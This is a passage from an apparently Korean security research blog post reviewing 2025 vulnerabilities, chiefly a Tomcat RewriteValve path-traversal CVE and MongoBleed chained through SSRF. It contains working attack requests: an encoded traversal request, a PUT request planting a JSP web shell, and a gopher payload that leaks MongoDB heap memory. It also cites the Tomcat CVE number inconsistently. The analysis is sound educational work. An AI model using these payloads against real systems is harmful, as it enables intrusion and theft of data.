영향 받은 패키지의 각 의존 수 / 출처 - [https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26](https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack#payload-analysis-26)

다음은 글 작성에 참조한 레퍼런스이다.

### References

[https://www.reversinglabs.com/blog/shai-hulud-worm-npm](https://www.reversinglabs.com/blog/shai-hulud-worm-npm)

[https://snyk.io/articles/npm-security-best-practices-shai-hulud-attack/](https://snyk.io/articles/npm-security-best-practices-shai-hulud-attack/)

[https://socket.dev/blog/nx-supply-chain-attack-investigation-github-actions-workflow-exploit](https://socket.dev/blog/nx-supply-chain-attack-investigation-github-actions-workflow-exploit)

[https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem](https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem)

## CVE-2025-5575

자바 웹 애플리케이션의 대명사이자, 엔터프라이즈 환경에서 가장 많이 사용되는 Apache Tomcat 이 프레임워크에서 최근 재밌는 취약점이 발견되었다.

![2022년 Java기반 서블릿 컨테이너 점유율](/[KR]%20Deep-research-of-2025-Security/image%2027.png)

2022년 Java기반 서블릿 컨테이너 점유율

이를 필자가 발견했던 모바일 환경에서 자주 발생한 Webview 취약점과의 유사성을 비교해보고, Tomcat의 Rewrite Rule에서 발생한 논리적 결함이 어떻게 심각한 영향으로 이어질 수 있는지 심층적으로 분석해보고자 한다.

취약점에 앞서 정규화의 개념을 명확히 짚고 넘어가보자.
정규화란 사용자로부터 입력받은 데이터를 시스템이 처리하기 전에 표준화된 형태로 정리하는 과정을 말한다.

![URL 정규화](/[KR]%20Deep-research-of-2025-Security/d603dbec-1ae2-4c1a-b4d2-e2f4b9517c59.png)

URL 정규화

웹 서버의 경로에서의 정규화는 말그대로 파일 경로(Path)를 다듬는 것을 의미한다. 예를 들어보자.

- 입력: `https://test.com/a/b/../c`
- 정규화 후: `https://test.com/a/c`

시스템은 `/../`와 같은 상위 디렉터리 참조 문자를 해석하여 실제 가리키는 경로로 변환 후에, 사용자에게 결과를 반환한다. 이는 개발자가 예상치 못한 경로 탐색을 막고 리소스의 위치를 명확히 하기 위함이다.

CVE-2025-55752 에선 경로를 정규화 하는 지점을 정하는 과정에서 중요한 보안 이슈가 발생했다.

### Rewrite Rule

Apache Tomcat은 자바 서블릿과 JSP를 실행하기 위한 웹 컨테이너다. 다양한 엔터프라이즈 환경에서 Tomcat은 Web Application Server의 역할도 수행하지만, 요청을 제어하고 분배하는 역할도 수행한다.

이때 사용되는 강력한 기능이 바로 Rewrite Rule이다.

### Redirect & Rewrite

- Redirect :
  - 서버가 클라이언트에게 경로가 ~라고 응답(3xx)을 보낸다.
  - 브라우저의 주소창이 변경된다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%2028.png)

- Rewrite :
  - 서버 내부에서 요청 경로를 조작하여 리소스를 매핑한다.
  - 클라이언트는 내부적으로 경로가 바뀌었는지 알 수 없다.

Tomcat의 Rewrite Valve는 `rewrite.config` 파일을 통해 유연하게 규칙을 정의할 수 있다. 특히 쿼리 파라미터를 정규표현식으로 파싱하여 경로(Path)의 일부로 사용하는 패턴은 각종 API에서 흔하게 사용된다.

### Vulnerability

CVE-2025-5575는 Tomcat의 Rewrite Valve가 쿼리 스트링을 처리하여 경로로 변환할 때, 정규화 이후에 디코딩이 이루어지는 점을 악용한다.

일반적으로 경로를 처리하는 메커니즘은 다음과 같이 동작해야 안전하다.

1. 요청 수신 (`%2e%2e`)
2. 디코딩 (`..`)
3. 정규화 (`..`를 감지하고 상위 경로 접근 차단 혹은 경로 정리)
4. 리소스 접근

하지만 취약한 버전의 Tomcat 설정에서는 다음과 같은 흐름이 발생한다.

1. 요청 수신: `GET /download?path=%2e%2e/WEB-INF`
2. Rewrite 실행: 쿼리 파라미터 `path`의 값을 추출.
3. 정규화 : `%2e%2e`는 URL 인코딩된 상태이므로, tomcat은 이를 단순 문자열로 인식한다. (상위 디렉터리 이동으로 간주하지 않는다.)
4. 경로 재작성: 추출된 값을 대상 경로에 붙인다. `/files/%2e%2e/WEB-INF`
5. 디코딩: Tomcat이 최종적으로 파일을 찾기 위해 경로를 해석할 때 디코딩이 수행된다. `/files/../WEB-INF`
6. 우회: 이미 정규화 단계를 지났으므로, `/files/../`가 실행되어 루트의 `WEB-INF`로 접근하게 된다.

위와 같은 과정으로 Tomcat의 보안필터를 우회하고 기존에는 접근이 불가능한 경로에 무단으로 접근할 수 있다.

이 지점에서, 몇 가지 재미있었던 점이 있었고, 이를 소개하고자 한다.

### Funny case

이러한 순서의 문제는 비단 서버 사이드만의 문제는 아닌 것 같다. 실제로 필자가 모바일 보안 연구를 진행했을 때, Android WebView에서도 이와 유사한 매커니즘의 취약점을 발견한 적이 다수 있다.

대표적으로 `loadUrl`과 `javascript:` 스킴을 이용한 브릿지(Bridge) 공격을 들어보겠다.

일반적으로 'executeJavascript' 등을 사용할 때는 입력값이 그대로 전달되어 실행되지만, `javascript:` 스키마를 통해 URL을 로드하는 경우, WebView 내부적으로 URL 디코딩이 수행된다.

```java
~
webView.loadUrl("javascript:handleData('" + userInput + "')");
```

개발자는 `"` (Double Quote)와 같은 특수문자를 필터링했다고 생각할 수 있다. 하지만 공격자가 `%22` (URL Encoded Double Quote)를 입력하면 어떻게 될까?

1. 필터링 : `%22`는 `"`가 아니므로 필터링을 통과한다.
2. 실행 : WebView가 URL을 로드하며 `%22`를 `"`로 디코딩한다.
3. 결과: 자바스크립트 문맥에서 문자열 인젝션이 발생하여 임의의 코드가 실행된다.

즉, 검증 이후에 변환이 발생하면서 보안 로직이 무력화되는 상황이다. 이번에 다룰 Tomcat의 취약점 역시 이와 유사한 맥락이다.

다시 CVE-2025-5575로 돌아가보자.

### Proof of Concept

실제 취약점을 재현해보았다. 테스트는 [masahiro331/CVE-2025-55752](https://github.com/masahiro331/CVE-2025-55752) 레포지토리를 참고하여 Docker 환경에서 진행했다.

위 레포에서 취약점을 유발하는 설정은 `rewrite.config`에 있다.

```
RewriteCond %{QUERY_STRING} ^path=(.*)$
RewriteRule ^/download$ /files/%1 [L]
```

- RewriteCond: 쿼리 스트링에서 `path=` 뒤의 값을 캡처한다.
- RewriteRule: `/download`로 들어온 요청을 `/files/` 뒤에 캡처한 값(`%1`)을 붙여 재작성한다.

즉, 이 규칙의 의도는 사용자가 `/download?path=image.png`를 요청하면 `/files/image.png`를 제공하려는 것이다.

이때 공격자는 다음과 같은 요청을 전송한다. (`.`을 `%e`로 인코딩해서 전송하였다.)

```
GET /download?path=%2e%2e/WEB-INF/web.xml HTTP/1.1
Host: localhost:8080
```

정상적인 상황이라면 `WEB-INF` 디렉터리는 외부에서 직접 접근이 불가능해야 한다. Tomcat은 기본적으로 이 디렉터리에 대한 접근을 차단한다.

하지만, Rewrite Rule을 통한 우회 공격을 시도할 경우 결과는 달라진다.

위 사진과 같이, 서버의 설정 파일인 `web.xml`의 내용이 공격자에게 노출되게 된다.

### Impact

`WEB-INF` 디렉터리 내에는 `web.xml` 뿐만 아니라 컴파일된 클래스 파일(`classes/`), 라이브러리(`lib/`), 그리고 때로는 DB 접속 정보가 담긴 프로퍼티 파일들이 존재한다.

이를 통해 공격자는 소스코드를 획득하거나 내부 인프라 정보를 확인할 수 있다. 심지어, 일부 서버는 HTTP PUT 메소드를 허용하는 경우도 있다.

Tomcat 설정(`web.xml`)에서 `readonly` 파라미터가 `false`로 설정되어 있다면, 공격자는 파일을 업로드할 수 있다.

1. 공격자는 Path Traversal을 이용해 접근 가능한 경로를 탐색한다.
2. 악성 JSP 웹쉘의 파일 내용을 담아 PUT 요청을 보낸다.

   ```
   PUT /download?path=%2e%2e/shell.jsp HTTP/1.1
   ...
   <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
   ```

3. Rewrite Rule에 의해 파일은 웹 루트 경로 등 실행 가능한 위치에 저장된다. (일반적으로 실행가능한 위치에 업로드 한다고 해도, rewrite로 필요한 파일만 불러서 실행하는 경우 접근이 어려운 경우가 많다.)
4. 공격자는 `WEB-INF`내부에 업로드된 `shell.jsp`를 호출하여 시스템 명령어를 실행한다.

```xml
 <servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
    <init-param>
      <param-name>fork</param-name>
      <param-value>false</param-value>
    </init-param>
    <load-on-startup>3</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>jsp</servlet-name>
    <url-pattern>*.jsp</url-pattern>
    <url-pattern>*.jspx</url-pattern>
  </servlet-mapping>

  <!-- Protect WEB-INF directory from direct access -->
  <!-- This constraint should prevent direct /WEB-INF/ access -->
  <!-- However, RewriteValve bypass makes it possible -->
  <security-constraint>
    <web-resource-collection>
      <web-resource-name>WEB-INF Protected</web-resource-name>
      <url-pattern>/WEB-INF/*</url-pattern>
    </web-resource-collection>
    <auth-constraint />
  </security-constraint>

  <!-- Session configuration -->
  <session-config>
    <tracking-mode>COOKIE</tracking-mode>
  </session-config>
```

위와 같은 설정의 특정 상황에서는 해당 취약점을 악용하여 RCE까지 가능하게 된다.

CVE-2025-5575의 경우 아래와 같이 패치되었다.

```java
...

chunk.append(REWRITE_DEFAULT_ENCODER.encode(urlStringRewriteEncoded, uriCharset));

// Decoded and normalized URI
// Rewriting may have denormalized the URL
- urlStringRewriteEncoded = RequestUtil.normalize(urlStringRewriteEncoded);

// Rewriting may have denormalized the URL and added encoded characters
// 기존 코드가 사라지고, 디코드 후에 정규화하는 과정이 추가됨
+ String urlStringRewriteDecoded = URLDecoder.decode(urlStringRewriteEncoded, uriCharset);
+ urlStringRewriteDecoded = RequestUtil.normalize(urlStringRewriteDecoded);

request.getCoyoteRequest().decodedURI().setChars(MessageBytes.EMPTY_CHAR_ARRAY, 0, 0);
chunk = request.getCoyoteRequest().decodedURI().getCharChunk();
if (context) {
				// This is decoded and normalized
				chunk.append(request.getServletContext().getContextPath());
}

...
```

패치된 코드를 확인해보면 기존에는 정규화를 먼저 진행한 반면에, 패치된 코드에서는 디코딩 후 정규화를 진행하는 방식으로 순서가 서로 바뀐 것을 알 수 있다.

## MongoBleed (CVE-2025-14847)

![image.png](/[KR]%20Deep-research-of-2025-Security/image%2029.png)

OBJ 기반의 데이터베이스인 MongoDB는 다양한 분야에서 폭넓게 사용된다. DB-Engines의 2026년 2월 랭킹에서도 MongoDB는 전체 DBMS 기준 상위권에 위치하고 있다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%2030.png)

2025년 12월, MongoDB Server의 pre-auth 단계에서 Heap 메모리 내용이 유출될 수 있는 취약점이 공개됐고, 취약점의 특징을 따와 MongoBleed라고 불리기 시작했다.

MongoDB는 네트워크에서 메시지를 주고받을 때 Wire Protocol을 쓰고, 여기에 압축을 위해 OP_COMPRESSED라는 래퍼(opcode 2012)를 제공한다.

공식 문서가 설명하는 OP_COMPRESSED의 필드는 다음과 같다.

- originalOpcode: 원래 감싸고 있던 opcode
- uncompressedSize: 헤더를 제외한 압축 해제 후의 크기
- compressorId: 어떤 알고리즘으로 압축했는지 (snappy / zlib / zstd 순…)
- compressedMessage: 실제 압축된 데이터

MongoDB 설정에서 네트워크 압축은 기본적으로 snappy,zstd,zlib 순으로 활성화되어 있다. 따라서, 환경에 따라서 zlib 이 기본값으로 들어올 수 있는 구조가 된다.

일반적으로 압축을 해제 하는 흐름은 다음과 같다.

1. 입력 수신
2. 헤더 파싱(필드 읽기)
3. 압축 해제 수행
4. 실제로 복원된 길이확인
5. 그 길이를 기준으로 파싱 진행

하지만, MongoBleed에서 문제가 된 취약점은 다음과 같은 로직에 의해서 발생하였다.

1. 공격자가 uncompressedSize 를 실제보다 크게 작성
2. 서버가 그 값을 충분히 검증하지 않거나(혹은 검증이 불충분)
3. 서버는 그 값으로 과도하게 큰 버퍼를 할당
4. 실제 압축 해제 결과는 더 작게 채워지고, 남는 부분은 초기화되지 않은 힙 메모리
5. 에러 처리/응답 생성 과정에서 그 버퍼(또는 그 일부)가 클라이언트로 되돌아가며 메모리 유출

### Proof Of Concept

https://github.com/joe-desimone/mongobleed

위 라이브러리에 MongoBleed를 쉽게 테스트하기 편하게 docker로 미리 세팅된 환경이 있다.

위 Github 레포지토리를 이용하여, 실제로 해당 취약점이 Web관점에서 어떻게 활용될 수 있는지 알아볼 예정이다.

SSRF 취약점이란, 공격자가 취약한 서버를 거점으로 삼아 외부에서 직접 접근할 수 없는 내부 네트워크나 시스템에 부적절한 HTTP 요청을 보내는 취약점을 말한다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%2031.png)

정의는 HTTP 요청이라고 명시되어 있지만, scheme를 잘 활용하면 HTTP 프로토콜 외 다른 프로토콜의 요청도 보낼 수 있다. 바로 이 지점에서 SSRF를 이용하여 MongoBleed를 트리거 할 수 있게 된다.

Gopher란 1990년대 초반, 월드 와이드 웹이 대중화되기 전 인터넷에서 문서를 검색하고 제공하기 위해 만들어진 분산 정보 검색 프로토콜을 말한다.

이 Gopher(고퍼)는 웹이 개발되기 전 FTP, Telnet과 같은 다양한 인터넷 서비스를 이용할 수 있게 해주었다.

```bash
# 실제로 gopher를 이용해 raw tcp를 이용하여 HTTP 요청을 전송할 수 있다.
curl gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a
```

리눅스 환경은 이 Gopher 프로토콜을 기본적으로 지원하기 때문에 RAW TCP 요청을 내부 환경에서 돌고 있는 MongoDB 서버로 전송할 수 있게 되고, 결과를 확인할 수 있을 경우 SSRF 취약점 하나만으로 MongoBleed 취약점까지 연계하여 민감정보를 탈취할 수 있게 된다.

```php
<?php

function getUrl($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	echo $pl;
	$content = shell_exec($pl);
	return $content;
}

if (isset($_POST['url'])&&!empty($_POST['url']))
{
    $url = $_POST['url'];
    $content_url = getUrl($url);
}
else
{
    $content_url = "";
}
if(isset($_GET['debug']))
{
    show_source(__FILE__);
}

?>

```

Python 스크립트를 수정하여, 서버로 전송되는 최종 페이로드만 따로 콘솔에 출력하게 하면 페이로드를 어렵지 않게 구할 수 있다.

```bash
# Leak 999 Bytes from server
gopher://mongodb-server:27017/_%2E%00%00%00%01%00%00%00%00%00%00%00%DC%07%00%00%DD%07%00%00%EB%04%00%00%02%78%9C%63%60%00%02%16%46%06%06%81%44%06%20%C9%00%00%03%00%00%78
```

위와 같은 페이로드를 실제로 php로 간단히 구현한 SSRF 취약점이 있는 서버에 넣고 전송해보면, 실제로 취약점이 트리거되며 다음과 같이 MongoDB 서버에 있는 일부 메모리의 값이 읽어진 것을 알 수 있다.

![image.png](/[KR]%20Deep-research-of-2025-Security/image%2032.png)

낮은 확률이겠지만, 여기에 사용자의 비밀번호 또는 민감정보가 포함될 수 있기 때문에 매우 치명적인 취약점이라고 할 수 있다. MongoBleed의 경우 WEB과는 전혀 관련이 없어보이는 Pwnable 계열의 취약점이지만, WEB 환경에서 발생하는 취약점을 이용하여 실제 메모리까지 유출해볼 수 있었다.

# 결론

지금까지 25년도를 휩쓸었던 취약점, 해킹사고, 공격기법 등에 대해 알아보았다. 물론 소개된 것 이외에도 파급력 있는 요소들이 많았으며, 해당 글에선 이를 모두 다루진 않았다. 본문에선 주로 파급력에 비해 크게 주목받지 않았던, 또한 관련 글이 부재하여 조사하기 어려운 요소를 주로 분석하고 재작성하였다. 관련 요소들을 조사하면서도 “이런 것도 있었네?” 싶은 취약점도 있었고, “이걸 왜 몰랐지?” 싶은 사건들도 있었다. 확실한 것은, 25년도를 돌아보며 각 요소를 조사하고 정립한 것만으로도 시야가 한층 넓어졌다는 것이다.

이 글로 하여금 더 많은 사람이 해킹을 더 쉽게 이해할 수 있기를 바라며, 또한 이해하는 걸 넘어 완전히 자신의 것으로 만들어 새로운 관점을 얻는데 도움이 되었기를 바라며 이 글을 마친다.
